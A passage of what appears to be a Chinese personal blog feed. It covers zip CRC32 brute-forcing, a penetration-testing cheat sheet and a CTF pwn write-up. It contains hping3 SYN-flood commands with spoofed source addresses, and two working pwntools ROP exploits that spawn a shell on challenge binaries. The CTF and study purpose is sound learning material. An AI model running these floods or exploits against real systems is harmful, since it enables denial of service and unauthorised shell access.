class="number">2</span>] = charSet[c];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">0</span>; d &lt; len; d++) &#123;</div><div class="line">tmp[<span class="number">3</span>] = charSet[d];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; len; e++) &#123;</div><div class="line">tmp[<span class="number">4</span>] = charSet[e];</div><div class="line"><span class="keyword">if</span> (Crc32_ComputeBuf(tmp, <span class="built_in">strlen</span>(tmp)) == crc32[h]) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, tmp);</div><div class="line"><span class="comment">//goto label;//若是存在碰撞，那么这里可以将这里注释掉</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">label :;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>得到明文，要看看是什么压缩算法的，只有压缩算法相同，才能用已知明文攻击。查看加密算法，建议用7z查看，将得到的明文加密，在与需要解密的压缩包做比较，这样算法一样的，就可以用已知明文攻击<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flgecoxxaej31100nwq6m.jpg" alt=""></p><h1 id="2、网络安全法"><a href="#2、网络安全法" class="headerlink" title="2、网络安全法"></a>2、网络安全法</h1><p><a href="https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html" target="_blank" rel="external">https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html</a></p><p>可以用ARCHPR和AZPR这里贴个链接吧<br><a href="https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html" target="_blank" rel="external">https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当然是有秘密不能给汝看，必学中华人民共和国网络安全法&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux渗透测试</title>
    <link href="http://yoursite.com/2017/11/09/misc_wifi/"/>
    <id>http://yoursite.com/2017/11/09/misc_wifi/</id>
    <published>2017-11-09T06:32:11.621Z</published>
    <updated>2018-03-15T03:24:22.997Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无事做，不如来渗透<br><a id="more"></a><br>啥为渗透，只限教学</p><h1 id="1、主机发现与端口扫描"><a href="#1、主机发现与端口扫描" class="headerlink" title="1、主机发现与端口扫描"></a>1、主机发现与端口扫描</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap [扫描类型…] [通用选项] {扫描目标说明}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v -sS <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span><span class="number">-254</span></div></pre></td></tr></table></figure><p>扫描10-254这段ip的主机，-p为扫描端口<br>-sS :TCP同步扫描(TCP SYN),因为不必全部打开一个TCP连接,所以这项技术通常称为半开扫描(half-open)。这项技术最大的好处是,很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包。<br>-sN :秘密扫描，有时可以骗过防火墙<br>-v     :冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。<br>-p  :如-p1-65535,扫描每台主机的1-65535端口<br>-A  :详细扫描</p><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>netdiscover [通用选项] [ip]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netdiscover -r <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">24</span></div></pre></td></tr></table></figure></p><p>-p  :被动扫描(贼慢)<br>扫描一个子网段<br>当然还有其他的扫描工具啦。etc</p><h1 id="2、dos"><a href="#2、dos" class="headerlink" title="2、dos"></a>2、dos</h1><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hping3 -I eth0 -S <span class="number">192.168</span><span class="number">.0</span><span class="number">.50</span> -a <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span> -p <span class="number">80</span> -i u1000</div></pre></td></tr></table></figure><p>向192.168.0.50主机80端口发起dos攻击，将自己ip伪装成10.10.10.1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hping3  -P -U --flood -V -a --rand-soucer -S <span class="number">10.21</span><span class="number">.13</span><span class="number">.97</span></div></pre></td></tr></table></figure></p><p>伪造IP地址的简单的SYN洪水攻击――使用HPING3的DoS<br>-a –rand-source : 使用随机性的源头IP地址。</p><h2 id="nping"><a href="#nping" class="headerlink" title="nping"></a>nping</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nping --tcp -p <span class="number">80</span> --flags rst --ttl <span class="number">2</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></div><div class="line">nping --icmp --icmp-type time --delay <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.254</span><span class="number">.254</span></div><div class="line">nping --echo-server <span class="string">"public"</span> -e wlan0 -vvv </div><div class="line">nping --echo-client <span class="string">"public"</span> echo.nmap.org --tcp -p1<span class="number">-1024</span> --flags ack</div></pre></td></tr></table></figure><h1 id="3、iptables"><a href="#3、iptables" class="headerlink" title="3、iptables"></a>3、iptables</h1><p><code>iptables -A INPUT -j DROP</code><br>屏蔽所有ip<br>参考:<a href="https://esebanana.github.io/page/2/" target="_blank" rel="external">https://esebanana.github.io/page/2/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无事做，不如来渗透&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN为了入群做题</title>
    <link href="http://yoursite.com/2017/11/03/pwn_ruqun/"/>
    <id>http://yoursite.com/2017/11/03/pwn_ruqun/</id>
    <published>2017-11-03T07:11:56.346Z</published>
    <updated>2018-03-26T13:08:03.781Z</updated>
    
    <content type="html"><![CDATA[<p>想学习，必要了解各位师傅，必入群<br><a id="more"></a></p><h1 id="1、x64"><a href="#1、x64" class="headerlink" title="1、x64"></a>1、x64</h1><h2 id="1、程序"><a href="#1、程序" class="headerlink" title="1、程序"></a>1、程序</h2><p>拿到题目<br>链接：<a href="http://pan.baidu.com/s/1pKTjqgr" target="_blank" rel="external">http://pan.baidu.com/s/1pKTjqgr</a> 密码：dhw5<br><code>checksec pwn2</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">    FORTIFY:  Enabled</div><div class="line">`</div></pre></td></tr></table></figure></p><p>程序可以知道是６４位的，它的传参优先由寄存器完成。<br>接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</p><h2 id="2、分析程序"><a href="#2、分析程序" class="headerlink" title="2、分析程序"></a>2、分析程序</h2><p>我们去尝试运行，摸清了基本上的程序的功能。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn2<span class="comment"># ./pwn2 </span></div><div class="line"></div><div class="line">Welcome to an easy Return Oriented Programming challenge...</div><div class="line">Menu:</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 1</div><div class="line">libc.so.6: 0x00007FB8DF81A9B0</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 2</div><div class="line">Enter symbol: system</div><div class="line">Symbol system: 0x00007FB8DF095450</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 3</div><div class="line">Enter bytes to send (max 1024): 3</div><div class="line">asd</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: Bad choice.</div></pre></td></tr></table></figure></p><p>功能1，可以获得libc的基址<br>功能2，可以获得函数的地址<br>功能3，输入的地方，感觉这个地方可能存在漏洞。</p><p>紧接着，我们可以用IDA 分析程序了。<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fk9f5lnogdj30gb0ixjre.jpg" alt=""><br>发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</p><p>void memcpy(voiddest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。savedregs是一个IDA关键字我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fk9f8tb1ldj30g9039dfm.jpg" alt=""><br>buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：<br>1、找到system的地址<br>2、找到”/bin/sh”地址，找不到就找个bss地址，将”/bin/sh”传入<br>3、找个gadgets像pop rdi,ret<br>完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。</p><h2 id="3、找"><a href="#3、找" class="headerlink" title="3、找"></a>3、找</h2><p>这个ROPgadget安装参考:<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget</a><br>找到本地的gadgets<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep rdi</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x000000000002079b : pop rdi ; pop rbp ; ret</div><div class="line">0x000000000001fc3a : pop rdi ; ret</div><div class="line">0x0000000000025312 : pop rdi ; ret 0x13</div></pre></td></tr></table></figure></p><p>参看目标libc版本：ldd<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">linux-vdso.so.1 (0x00007ffecd990000)</div><div class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f427bb9d000)</div><div class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f427b7fe000)</div><div class="line">/lib64/ld-linux-x86-64.so.2 (0x0000561313850000)</div></pre></td></tr></table></figure></p><p>找到本地的/bin/sh<br><code>strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn2<span class="comment"># strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"</span></div><div class="line"> 161999 /bin/sh</div></pre></td></tr></table></figure></p><p>可以知道”/bin/sh”偏移是0x161999<br>至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</p><h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp:"></a>4、exp:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def get_libc_func_addr(p, <span class="keyword">function</span>):</div><div class="line">  p.send(<span class="string">"2\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"Enter symbol: "</span>)</div><div class="line">  p.send(<span class="keyword">function</span>+<span class="string">"\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"4) Exit\n: "</span>)</div><div class="line">  offset = msg.find(<span class="string">":"</span>)</div><div class="line">  offset2 = msg.find(<span class="string">"\n"</span>)</div><div class="line">  addr = msg[offset+2: offset2]</div><div class="line">  <span class="built_in">return</span> long(addr, 16)</div><div class="line"></div><div class="line">def send(p,payload):</div><div class="line">  p.sendline(<span class="string">"3"</span>)</div><div class="line">  p.recv(1024)</div><div class="line">  p.send(<span class="string">"%d\n"</span>%(len(payload)+1))</div><div class="line">  p.sendline(payload)</div><div class="line">  p.sendline(<span class="string">"4"</span>)</div><div class="line">  <span class="built_in">return</span></div><div class="line"></div><div class="line">p=process(<span class="string">"./pwn2"</span>)  </div><div class="line"><span class="comment">#p=remote("127.0.0.1",4001)</span></div><div class="line">so = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="comment">#so=ELF('libc.so.6')</span></div><div class="line"></div><div class="line">system_addr=get_libc_func_addr(p,<span class="string">"system"</span>)</div><div class="line"><span class="built_in">print</span> hex(system_addr)</div><div class="line"></div><div class="line">system_offset=0x780560</div><div class="line">system_offset=so.symbols[<span class="string">'system'</span>]</div><div class="line">base=system_addr-system_offset</div><div class="line"><span class="built_in">print</span> hex(base)</div><div class="line"></div><div class="line">pop_r_offset=0x1fc3a</div><div class="line">pop_r_addr=base+pop_r_offset</div><div class="line"></div><div class="line">sh_offset=0x161999</div><div class="line">sh_addr=base+sh_offset</div><div class="line"></div><div class="line">payload=<span class="string">'a'</span>*8+p64(pop_r_addr)+p64(sh_addr)+p64(system_addr)</div><div class="line"></div><div class="line">send(p,payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>这里记录一下我走过的坑，<br>不知道libc.so.6的地址打印出来是干什么的，开始我认为是libc_base,但是它的值比打印出来的system值大，这就很奇怪，因为：<br>system_offset = so.symbols[‘system’]<br>systemAddr -  system_offset = libc_base<br>writeAddr -so.symbols[‘write’] = libc_base</p><p>所以不知道它的作用是什么，但这道题，没有给libc.so.6,据说是可以查看版本的，这里我就偷懒的，因为和上一道题是在同一台机器上的，那肯定用同一个libc库了，直接拿来用</p><h1 id="2、入群"><a href="#2、入群" class="headerlink" title="2、入群"></a>2、入群</h1><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p><p>害怕-恐怖</p><p>才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试，</p><p>然后，研究几分钟，发现就很简单算法</p><h2 id="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><a href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心" class="headerlink" title="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"></a>这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</h2><p>Do_more_and_ask_less</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想学习，必要了解各位师傅，必入群&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
